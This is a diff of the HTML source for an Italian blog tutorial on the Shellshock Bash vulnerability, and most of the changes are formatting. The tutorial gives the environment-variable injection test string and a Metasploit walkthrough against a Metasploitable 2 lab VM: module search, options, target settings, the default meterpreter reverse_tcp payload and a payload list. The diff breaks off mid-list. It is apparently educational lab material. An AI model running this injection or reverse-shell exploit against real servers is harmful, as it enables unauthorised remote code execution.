@@ -6,7 +6,8 @@
   
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Table of Contents  Cos&amp;rsquo;è Shellshock? In che modo Apache e CGI giocano in questo Exploit con Metasploit Privilage Escalation   Cos&amp;rsquo;è Shellshock? La vulnerabilità Shellshock consente a un aggressore di sfruttare vecchie versioni di Bash che salvano in modo scorretto le variabili d&amp;rsquo;ambiente. Tipicamente, quando si salva una funzione come variabile, la funzione della shell si interromperà dove è definita per terminare da parte del creatore. Le versioni vulnerabili di Bash consentiranno a un aggressore di eseguire comandi del sistema operativo che vengono inclusi dopo una funzione memorizzata all&amp;rsquo;interno di una variabile d&amp;rsquo;ambiente." />
+<meta name="description" content=" Cos&amp;rsquo;è Shellshock? La vulnerabilità Shellshock consente a un aggressore di sfruttare vecchie versioni di Bash che salvano in modo scorretto le variabili d&amp;rsquo;ambiente. Tipicamente, quando si salva una funzione come variabile, la funzione della shell si interromperà dove è definita per terminare da parte del creatore.
+" />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
 <link rel="canonical" href="https://kobra3390.github.io/SpaceHack/posts/introduzione-a-shellshock/introduzione_a_shellshock/" />
@@ -45,7 +46,8 @@
 <meta property="og:locale" content="en" />
 <meta property="og:type" content="article" />
 <meta property="og:title" content="Cos&#39;è ShellShock">
-<meta property="og:description" content="Table of Contents  Cos&amp;rsquo;è Shellshock? In che modo Apache e CGI giocano in questo Exploit con Metasploit Privilage Escalation   Cos&amp;rsquo;è Shellshock? La vulnerabilità Shellshock consente a un aggressore di sfruttare vecchie versioni di Bash che salvano in modo scorretto le variabili d&amp;rsquo;ambiente. Tipicamente, quando si salva una funzione come variabile, la funzione della shell si interromperà dove è definita per terminare da parte del creatore. Le versioni vulnerabili di Bash consentiranno a un aggressore di eseguire comandi del sistema operativo che vengono inclusi dopo una funzione memorizzata all&amp;rsquo;interno di una variabile d&amp;rsquo;ambiente." />
+<meta property="og:description" content=" Cos&amp;rsquo;è Shellshock? La vulnerabilità Shellshock consente a un aggressore di sfruttare vecchie versioni di Bash che salvano in modo scorretto le variabili d&amp;rsquo;ambiente. Tipicamente, quando si salva una funzione come variabile, la funzione della shell si interromperà dove è definita per terminare da parte del creatore.
+" />
 <meta property="og:url" content="https://kobra3390.github.io/SpaceHack/posts/introduzione-a-shellshock/introduzione_a_shellshock/" />
 <meta property="og:site_name" content="HomePage" />
 
@@ -60,6 +62,8 @@
 
   <meta property="article:section" content="Linux Vulnerability" />
 
+
+  <meta property="article:published_time" content="0001-01-01 00:00:00 &#43;0000 UTC" />
 
 
 
@@ -140,7 +144,7 @@
       <span class="post-author">Autore: k0Br@3390</span>
     
     
-      <span class="post-reading-time">:: 22 min read (4610 words)</span>
+      <span class="post-reading-time">:: 22 min read (4591 words)</span>
     
   </div>
 
@@ -163,26 +167,33 @@
 
 
   
+    <div class="table-of-contents">
+      <h2>
+        Table of Contents
+      </h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#cosè-shellshock">Cos&rsquo;è Shellshock?</a></li>
+    <li><a href="#in-che-modo-apache-e-cgi-giocano-in-questo">In che modo Apache e CGI giocano in questo</a></li>
+    <li><a href="#exploit-con-metasploit">Exploit con Metasploit</a></li>
+    <li><a href="#privilage-escalation">Privilage Escalation</a></li>
+  </ul>
+</nav>
+    </div>
+  
 
   <div class="post-content"><div>
         <hr>
-<h2 id="table-of-contents">Table of Contents<a href="#table-of-contents" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
-<ul>
-<li><a href="#cos-%C3%A8-shellshock-">Cos&rsquo;è Shellshock?</a></li>
-<li><a href="#in-che-modo-apache-e-cgi-giocano-in-questo">In che modo Apache e CGI giocano in questo</a></li>
-<li><a href="#exploit-con-metasploit">Exploit con Metasploit</a></li>
-<li><a href="#privilage-escalation">Privilage Escalation</a></li>
-</ul>
-<hr>
 <h1 id="cosè-shellshock">Cos&rsquo;è Shellshock?<a href="#cosè-shellshock" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
-<p>La vulnerabilità Shellshock consente a un aggressore di sfruttare vecchie versioni di Bash che salvano in modo scorretto le variabili d&rsquo;ambiente. Tipicamente, quando si salva una funzione come variabile, la funzione della shell si interromperà dove è definita per terminare da parte del creatore. Le versioni vulnerabili di Bash consentiranno a un aggressore di eseguire comandi del sistema operativo che vengono inclusi dopo una funzione memorizzata all&rsquo;interno di una variabile d&rsquo;ambiente. Vediamo un semplice esempio in cui definiamo una variabile d&rsquo;ambiente e includiamo un comando maligno successivamente.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ env y<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;() { :;}; echo vulnerable-shellshock&#39;</span> bash -c <span style="color:#e6db74">&#34;echo not vulnerable&#34;</span>
-</code></pre></div><p>Quando la variabile sopra è assegnata, Bash interpreterà la parte <code>y='() { :;};'</code> come la definizione di una funzione per una variabile <code>y</code>. La funzione non fa nulla se non restituire un codice di uscita <code>0</code>, ma quando viene importata, eseguirà il comando <code>echo vulnerable-shellshock</code> se la versione di Bash è vulnerabile. Questo (o qualsiasi altro comando, come un one-liner per una reverse shell) verrà eseguito nel contesto dell&rsquo;utente del server web. La maggior parte delle volte, questo sarà un utente come <code>www-data</code>, e avremo accesso al sistema ma dovremo comunque ottenere privilegi elevati. Occasionalmente, potremo avere molta fortuna e ottenere l&rsquo;accesso come utente <code>root</code> se il server web viene eseguito in un contestoelevato.</p>
+<p>La vulnerabilità Shellshock consente a un aggressore di sfruttare vecchie versioni di Bash che salvano in modo scorretto le variabili d&rsquo;ambiente. Tipicamente, quando si salva una funzione come variabile, la funzione della shell si interromperà dove è definita per terminare da parte del creatore.</p>
+<p>Le versioni vulnerabili di Bash consentiranno a un aggressore di eseguire comandi del sistema operativo che vengono inclusi dopo una funzione memorizzata all&rsquo;interno di una variabile d&rsquo;ambiente. Vediamo un semplice esempio in cui definiamo una variabile d&rsquo;ambiente e includiamo un comando maligno successivamente.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ env y<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;() { :;}; echo vulnerable-shellshock&#39;</span> bash -c <span style="color:#e6db74">&#34;echo not vulnerable&#34;</span>
+</span></span></code></pre></div><p>Quando la variabile sopra è assegnata, Bash interpreterà la parte <code>y='() { :;};'</code> come la definizione di una funzione per una variabile <code>y</code>. La funzione non fa nulla se non restituire un codice di uscita <code>0</code>, ma quando viene importata, eseguirà il comando <code>echo vulnerable-shellshock</code> se la versione di Bash è vulnerabile. Questo (o qualsiasi altro comando, come un one-liner per una reverse shell) verrà eseguito nel contesto dell&rsquo;utente del server web. La maggior parte delle volte, questo sarà un utente come <code>www-data</code>, e avremo accesso al sistema ma dovremo comunque ottenere privilegi elevati. Occasionalmente, potremo avere molta fortuna e ottenere l&rsquo;accesso come utente <code>root</code> se il server web viene eseguito in un contestoelevato.</p>
 <p>Se il sistema non è vulnerabile, verrà stampato solo <code>&quot;not vulnerable&quot;</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ env y<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;() { :;}; echo vulnerable-shellshock&#39;</span> bash -c <span style="color:#e6db74">&#34;echo not vulnerable&#34;</span>
-
-not vulnerable
-</code></pre></div><ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ env y<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;() { :;}; echo vulnerable-shellshock&#39;</span> bash -c <span style="color:#e6db74">&#34;echo not vulnerable&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>not vulnerable
+</span></span></code></pre></div><ol>
 <li>
 <p><code>env y='() { :;}; echo vulnerable-shellshock'</code>: Questa parte del comando imposta una variabile d&rsquo;ambiente chiamata <code>y</code> con un valore specifico, che è una stringa che contiene una funzione Bash malevola (<code>() { :;}; echo vulnerable-shellshock</code>). Questa funzione sfrutta la vulnerabilità Shellshock.</p>
 </li>
@@ -202,434 +213,434 @@ Bash non interpreterà più <code>y=() {...}</code> come una definizione di funz
 <h1 id="exploit-con-metasploit">Exploit con Metasploit<a href="#exploit-con-metasploit" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>Metasploitable 2 è un&rsquo;eccellente macchina virtuale piena di vulnerabilità con cui allenare le nostre abilità di hacking.</p>
 <p>Affinché questo exploit funzioni, deve esserci uno script eseguibile situato nella directory /cgi-bin. Utilizzeremo un semplice hello.sh, questo script Bash funzionerà a scopo dimostrativo. Passiamo a Metasploitable2 e andiamo in <strong>/usr/lib/cgi-bin</strong> e digitiamo il seguente comando:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nano hello.sh
-</code></pre></div><p>Inseriamo la password corretta, quindi scriviamo all’interno quanto segue:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#! /bin/bash
-</span><span style="color:#75715e"></span>echo <span style="color:#e6db74">&#34;Content-type: text/html&#34;</span>
-echo <span style="color:#e6db74">&#34;&#34;</span>
-echo <span style="color:#e6db74">&#34;Hello world!&#34;</span>
-</code></pre></div><p>Premiamo <em>Ctrl-X</em>, seguito da <em>Y</em> e <em>Enter</em> per salvare. Per rendere eseguibile questo file, utilizziamo il comando <strong>chmod</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo chmod <span style="color:#ae81ff">755</span> hello.sh
-</code></pre></div><p>Possiamo verificare che funzioni correttamente navigando nel file sul server web:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nano hello.sh
+</span></span></code></pre></div><p>Inseriamo la password corretta, quindi scriviamo all’interno quanto segue:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#! /bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>echo <span style="color:#e6db74">&#34;Content-type: text/html&#34;</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;Hello world!&#34;</span>
+</span></span></code></pre></div><p>Premiamo <em>Ctrl-X</em>, seguito da <em>Y</em> e <em>Enter</em> per salvare. Per rendere eseguibile questo file, utilizziamo il comando <strong>chmod</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo chmod <span style="color:#ae81ff">755</span> hello.sh
+</span></span></code></pre></div><p>Possiamo verificare che funzioni correttamente navigando nel file sul server web:</p>
 
   <img src="https://kobra3390.github.io/SpaceHack/images/exploit-shellshock.jpg"  class="left"  style="width: 700px"  />
 
 
 <p>Sulla macchina Kali, avviamo Metasploit digitando <strong>msfconsole</strong> nel terminale. Siamo accolti da un banner casuale e dal prompt dei comandi di Metasploit:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>k0bra3390㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop<span style="color:#f92672">]</span>
-└─$ msfconsole
-                                                  
-%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
-%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
-%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
-%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
-%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
-%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
-%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
-%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
-%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-
-       <span style="color:#f92672">=[</span> metasploit v6.3.21-dev                          <span style="color:#f92672">]</span>
-+ -- --<span style="color:#f92672">=[</span> <span style="color:#ae81ff">2329</span> exploits - <span style="color:#ae81ff">1223</span> auxiliary - <span style="color:#ae81ff">413</span> post       <span style="color:#f92672">]</span>
-+ -- --<span style="color:#f92672">=[</span> <span style="color:#ae81ff">1385</span> payloads - <span style="color:#ae81ff">46</span> encoders - <span style="color:#ae81ff">11</span> nops           <span style="color:#f92672">]</span>
-+ -- --<span style="color:#f92672">=[</span> <span style="color:#ae81ff">9</span> evasion                                       <span style="color:#f92672">]</span>
-
-Metasploit tip: You can upgrade a shell to a Meterpreter 
-session on many platforms using sessions -u 
-&lt;session_id&gt;
-Metasploit Documentation: https://docs.metasploit.com/
-
-msf6 &gt;
-</code></pre></div><p>Possiamo facilmente cercare exploit utilizzando il comando di <strong>search</strong>. Digitiamo <strong>search shellshock</strong>, individuiamo il modulo <strong>apache_mod_cgi_bash_env_exec</strong> e copiamo il percorso:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6 &gt; search shellshock
-
-Matching Modules
-<span style="color:#f92672">================</span>
-
-   <span style="color:#75715e">#   Name                                               Disclosure Date  Rank       Check  Description</span>
-   -   ----                                               ---------------  ----       -----  -----------
-   <span style="color:#ae81ff">0</span>   exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Yes    Advantech Switch Bash Environment Variable Code Injection <span style="color:#f92672">(</span>Shellshock<span style="color:#f92672">)</span>
-   <span style="color:#ae81ff">1</span>   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection <span style="color:#f92672">(</span>Shellshock<span style="color:#f92672">)</span>
-   <span style="color:#ae81ff">2</span>   auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection <span style="color:#f92672">(</span>Shellshock<span style="color:#f92672">)</span> Scanner
-   <span style="color:#ae81ff">3</span>   exploit/multi/http/cups_bash_env_exec              2014-09-24       excellent  Yes    CUPS Filter Bash Environment Variable Code Injection <span style="color:#f92672">(</span>Shellshock<span style="color:#f92672">)</span>
-   <span style="color:#ae81ff">4</span>   auxiliary/server/dhclient_bash_env                 2014-09-24       normal     No     DHCP Client Bash Environment Variable Code Injection <span style="color:#f92672">(</span>Shellshock<span style="color:#f92672">)</span>
-   <span style="color:#ae81ff">5</span>   exploit/unix/dhcp/bash_environment                 2014-09-24       excellent  No     Dhclient Bash Environment Variable Injection <span style="color:#f92672">(</span>Shellshock<span style="color:#f92672">)</span>
-   <span style="color:#ae81ff">6</span>   exploit/linux/http/ipfire_bashbug_exec             2014-09-29       excellent  Yes    IPFire Bash Environment Variable Injection <span style="color:#f92672">(</span>Shellshock<span style="color:#f92672">)</span>
-   <span style="color:#ae81ff">7</span>   exploit/multi/misc/legend_bot_exec                 2015-04-27       excellent  Yes    Legend Perl IRC Bot Remote Code Execution
-   <span style="color:#ae81ff">8</span>   exploit/osx/local/vmware_bash_function_root        2014-09-24       normal     Yes    OS X VMWare Fusion Privilege Escalation via Bash Environment Code Injection <span style="color:#f92672">(</span>Shellshock<span style="color:#f92672">)</span>
-   <span style="color:#ae81ff">9</span>   exploit/multi/ftp/pureftpd_bash_env_exec           2014-09-24       excellent  Yes    Pure-FTPd External Authentication Bash Environment Variable Code Injection <span style="color:#f92672">(</span>Shellshock<span style="color:#f92672">)</span>
-   <span style="color:#ae81ff">10</span>  exploit/unix/smtp/qmail_bash_env_exec              2014-09-24       normal     No     Qmail SMTP Bash Environment Variable Injection <span style="color:#f92672">(</span>Shellshock<span style="color:#f92672">)</span>
-   <span style="color:#ae81ff">11</span>  exploit/multi/misc/xdh_x_exec                      2015-12-04       excellent  Yes    Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution
-
-Interact with a module by name or index. For example info 11, use <span style="color:#ae81ff">11</span> or use exploit/multi/misc/xdh_x_exec
-</code></pre></div><p>Carichiamo questo exploit digitando <strong>use</strong> seguito dalla posizione che abbiamo precedentemente copiato. Ora dovrebbe esserci un prompt più lungo che indica il modulo attualmente caricato:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6 &gt; use exploit/multi/http/apache_mod_cgi_bash_env_exec
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
-msf6 exploit<span style="color:#f92672">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span> &gt;
-</code></pre></div><p>Digitiamo <strong>options</strong> per vedere le varie impostazioni per questo modulo:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6 exploit<span style="color:#f92672">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span> &gt; options 
-
-Module options <span style="color:#f92672">(</span>exploit/multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span>:
-
-   Name            Current Setting  Required  Description
-   ----            ---------------  --------  -----------
-   CMD_MAX_LENGTH  <span style="color:#ae81ff">2048</span>             yes       CMD max line length
-   CVE             CVE-2014-6271    yes       CVE to check/exploit <span style="color:#f92672">(</span>Accepted: CVE-2014-6271, CVE-2014-6278<span style="color:#f92672">)</span>
-   HEADER          User-Agent       yes       HTTP header to use
-   METHOD          GET              yes       HTTP method to use
-   Proxies                          no        A proxy chain of format type:host:port<span style="color:#f92672">[</span>,type:host:port<span style="color:#f92672">][</span>...<span style="color:#f92672">]</span>
-   RHOSTS                           yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
-   RPATH           /bin             yes       Target PATH <span style="color:#66d9ef">for</span> binaries used by the CmdStager
-   RPORT           <span style="color:#ae81ff">80</span>               yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
-   SSL             false            no        Negotiate SSL/TLS <span style="color:#66d9ef">for</span> outgoing connections
-   SSLCert                          no        Path to a custom SSL certificate <span style="color:#f92672">(</span>default is randomly generated<span style="color:#f92672">)</span>
-   TARGETURI                        yes       Path to CGI script
-   TIMEOUT         <span style="color:#ae81ff">5</span>                yes       HTTP read response timeout <span style="color:#f92672">(</span>seconds<span style="color:#f92672">)</span>
-   URIPATH                          no        The URI to use <span style="color:#66d9ef">for</span> this exploit <span style="color:#f92672">(</span>default is random<span style="color:#f92672">)</span>
-   VHOST                            no        HTTP server virtual host
-
-   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
-
-   Name     Current Setting  Required  Description
-   ----     ---------------  --------  -----------
-   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
-   SRVPORT  <span style="color:#ae81ff">8080</span>             yes       The local port to listen on.
-
-Payload options <span style="color:#f92672">(</span>linux/x86/meterpreter/reverse_tcp<span style="color:#f92672">)</span>:
-
-   Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LHOST  192.168.1.176    yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
-   LPORT  <span style="color:#ae81ff">4444</span>             yes       The listen port
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   <span style="color:#ae81ff">0</span>   Linux x86
-
-View the full module info with the info, or info -d command.
-</code></pre></div><p>Possiamo lasciare la maggior parte delle impostazioni predefinite, ma dovremo impostare l&rsquo;host remoto sull&rsquo;indirizzo IP della destinazione e l&rsquo;URI di destinazione sul file che abbiamo inserito nella directory /cgi-bin, in questo modo:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6 exploit<span style="color:#f92672">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span> &gt; set RHOSTS 192.168.1.245
-RHOSTS <span style="color:#f92672">=</span>&gt; 192.168.1.245
-msf6 exploit<span style="color:#f92672">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span> &gt; set TARGETURI /cgi-bin/hello.sh
-TARGETURI <span style="color:#f92672">=</span>&gt; /cgi-bin/hello.sh
-msf6 exploit<span style="color:#f92672">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span> &gt;
-</code></pre></div><p>Successivamente, dobbiamo scegliere un payload. Digitiamo <strong>show payloads</strong> per visualizzare i diversi payload e le informazioni relative a ciascuno di essi:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6 exploit<span style="color:#f92672">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span> &gt; show payloads
-
-Compatible Payloads
-<span style="color:#f92672">===================</span>
-
-   <span style="color:#75715e">#   Name                                              Disclosure Date  Rank    Check  Description</span>
-   -   ----                                              ---------------  ----    -----  -----------
-   <span style="color:#ae81ff">0</span>   payload/generic/custom                                             normal  No     Custom Payload
-   <span style="color:#ae81ff">1</span>   payload/generic/debug_trap                                         normal  No     Generic x86 Debug Trap
-   <span style="color:#ae81ff">2</span>   payload/generic/shell_bind_aws_ssm                                 normal  No     Command Shell, Bind SSM <span style="color:#f92672">(</span>via AWS API<span style="color:#f92672">)</span>
-   <span style="color:#ae81ff">3</span>   payload/generic/shell_bind_tcp                                     normal  No     Generic Command Shell, Bind TCP Inline
-   <span style="color:#ae81ff">4</span>   payload/generic/shell_reverse_tcp                                  normal  No     Generic Command Shell, Reverse TCP Inline
-   <span style="color:#ae81ff">5</span>   payload/generic/ssh/interact                                       normal  No     Interact with Established SSH Connection
-   <span style="color:#ae81ff">6</span>   payload/generic/tight_loop                                         normal  No     Generic x86 Tight Loop
-   <span style="color:#ae81ff">7</span>   payload/linux/x86/chmod                                            normal  No     Linux Chmod
-   <span style="color:#ae81ff">8</span>   payload/linux/x86/exec                                             normal  No     Linux Execute Command
-   <span style="color:#ae81ff">9</span>   payload/linux/x86/meterpreter/bind_ipv6_tcp                        normal  No     Linux Mettle x86, Bind IPv6 TCP Stager <span style="color:#f92672">(</span>Linux x86<span style="color:#f92672">)</span>
-   <span style="color:#ae81ff">10</span>  payload/linux/x86/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Linux Mettle x86, Bind IPv6 TCP Stager with UUID Support <span style="color:#f92672">(</span>Linux x86<span style="color:#f92672">)</span>
-   <span style="color:#ae81ff">11</span>  payload/linux/x86/meterpreter/bind_nonx_tcp                        normal  No     Linux Mettle x86, Bind TCP Stager
-   <span style="color:#ae81ff">12</span>  payload/linux/x86/meterpreter/bind_tcp                             normal  No     Linux Mettle x86, Bind TCP Stager <span style="color:#f92672">(</span>Linux x86<span style="color:#f92672">)</span>
-   <span style="color:#ae81ff">13</span>  payload/linux/x86/meterpreter/bind_tcp_uuid                        normal  No     Linux Mettle x86, Bind TCP Stager with UUID Support <span style="color:#f92672">(</span>Linux x86<span style="color:#f92672">)</span>
-   <span style="color:#ae81ff">14</span>  payload/linux/x86/meterpreter/reverse_ipv6_tcp                     normal  No     Linux Mettle x86, Reverse TCP Stager <span style="color:#f92672">(</span>IPv6<span style="color:#f92672">)</span>
-   <span style="color:#ae81ff">15</span>  payload/linux/x86/meterpreter/reverse_nonx_tcp                     normal  No     Linux Mettle x86, Reverse TCP Stager
-   <span style="color:#ae81ff">16</span>  payload/linux/x86/meterpreter/reverse_tcp                          normal  No     Linux Mettle x86, Reverse TCP Stager
-   <span style="color:#ae81ff">17</span>  payload/linux/x86/meterpreter/reverse_tcp_uuid                     normal  No     Linux Mettle x86, Reverse TCP Stager
-   <span style="color:#ae81ff">18</span>  payload/linux/x86/metsvc_bind_tcp                                  normal  No     Linux Meterpreter Service, Bind TCP
-   <span style="color:#ae81ff">19</span>  payload/linux/x86/metsvc_reverse_tcp                               normal  No     Linux Meterpreter Service, Reverse TCP Inline
-   <span style="color:#ae81ff">20</span>  payload/linux/x86/read_file                                        normal  No     Linux Read File
-   <span style="color:#ae81ff">21</span>  payload/linux/x86/shell/bind_ipv6_tcp                              normal  No     Linux Command Shell, Bind IPv6 TCP Stager <span style="color:#f92672">(</span>Linux x86<span style="color:#f92672">)</span>
-   <span style="color:#ae81ff">22</span>  payload/linux/x86/shell/bind_ipv6_tcp_uuid                         normal  No     Linux Command Shell, Bind IPv6 TCP Stager with UUID Support <span style="color:#f92672">(</span>Linux x86<span style="color:#f92672">)</span>
-   <span style="color:#ae81ff">23</span>  payload/linux/x86/shell/bind_nonx_tcp                              normal  No     Linux Command Shell, Bind TCP Stager
-   <span style="color:#ae81ff">24</span>  payload/linux/x86/shell/bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Stager <span style="color:#f92672">(</span>Linux x86<span style="color:#f92672">)</span>
-   <span style="color:#ae81ff">25</span>  payload/linux/x86/shell/bind_tcp_uuid                              normal  No     Linux Command Shell, Bind TCP Stager with UUID Support <span style="color:#f92672">(</span>Linux x86<span style="color:#f92672">)</span>
-   <span style="color:#ae81ff">26</span>  payload/linux/x86/shell/reverse_ipv6_tcp                           normal  No     Linux Command Shell, Reverse TCP Stager <span style="color:#f92672">(</span>IPv6<span style="color:#f92672">)</span>
-   <span style="color:#ae81ff">27</span>  payload/linux/x86/shell/reverse_nonx_tcp                           normal  No     Linux Command Shell, Reverse TCP Stager
-   <span style="color:#ae81ff">28</span>  payload/linux/x86/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager
-   <span style="color:#ae81ff">29</span>  payload/linux/x86/shell/reverse_tcp_uuid                           normal  No     Linux Command Shell, Reverse TCP Stager
-   <span style="color:#ae81ff">30</span>  payload/linux/x86/shell_bind_ipv6_tcp                              normal  No     Linux Command Shell, Bind TCP Inline <span style="color:#f92672">(</span>IPv6<span style="color:#f92672">)</span>
-   <span style="color:#ae81ff">31</span>  payload/linux/x86/shell_bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Inline
-   <span style="color:#ae81ff">32</span>  payload/linux/x86/shell_bind_tcp_random_port                       normal  No     Linux Command Shell, Bind TCP Random Port Inline
-   <span style="color:#ae81ff">33</span>  payload/linux/x86/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline
-   <span style="color:#ae81ff">34</span>  payload/linux/x86/shell_reverse_tcp_ipv6                           normal  No     Linux Command Shell, Reverse TCP Inline <span style="color:#f92672">(</span>IPv6<span style="color:#f92672">)</span>
